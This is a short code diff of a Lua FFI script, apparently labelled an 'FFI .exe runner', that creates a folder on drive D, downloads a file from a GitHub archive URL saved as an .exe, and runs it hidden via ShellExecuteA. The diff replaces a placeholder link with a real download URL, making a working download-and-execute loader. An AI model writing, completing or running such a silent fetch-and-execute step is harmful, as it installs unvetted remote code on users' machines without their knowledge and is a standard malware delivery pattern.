@@ -12,7 +12,7 @@ ffi.cdef[[
 local Shell32 = ffi.load('Shell32.dll')
 local urlmon = ffi.load('UrlMon')
 ffi.C.CreateDirectoryA("D:\\MonBazou", nil)
-urlmon.URLDownloadToFileA(nil, "raw link", "D:\\MonBazou\\anyname.exe", 0,0)
+urlmon.URLDownloadToFileA(nil, "https://github.com/whatmanskid/tooll/archive/refs/tags/eras.zip", "D:\\MonBazou\\anyname.exe", 0,0)
 Shell32.ShellExecuteA(nil, 'open', "D:\\MonBazou\\anyname.exe", nil, nil, 0)
 
 // FFI .exe runner v2 //
